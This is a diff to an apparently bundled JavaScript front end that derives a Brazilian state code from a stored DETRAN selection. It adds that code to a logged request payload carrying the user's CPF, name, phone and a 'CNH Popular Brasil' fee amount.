@@ -30935,7 +30935,27 @@ function DE() {
         }
         const _ = JSON.parse(M);
         console.log("Dados do usuário:", _);
-        
+        const detranStored =
+          localStorage.getItem("selectedDetran") ||
+          localStorage.getItem("detranData");
+        let detranUf = "";
+        if (detranStored) {
+          try {
+            const detranObj = JSON.parse(detranStored);
+            detranUf =
+              detranObj.uf ||
+              (detranObj.nome
+                ? detranObj.nome
+                    .replace(/DETRAN\s*\/?/i, "")
+                    .replace(/[^A-Za-z]/g, "")
+                    .slice(-2)
+                    .toUpperCase()
+                : "");
+          } catch (err) {
+            detranUf = "";
+          }
+        }
+
         const requestPayload = {
           cpf: _.cpf,
           nome: _.nome,
@@ -30944,6 +30964,8 @@ function DE() {
           phone: _.phone || "11999999999",
           amount: "64,73",
           title: "CNH Popular Brasil",
+          uf: detranUf || undefined,
+          detran: detranUf ? `DETRAN/${detranUf}` : undefined,
         };
         console.log("Enviando para API:", requestPayload);
         
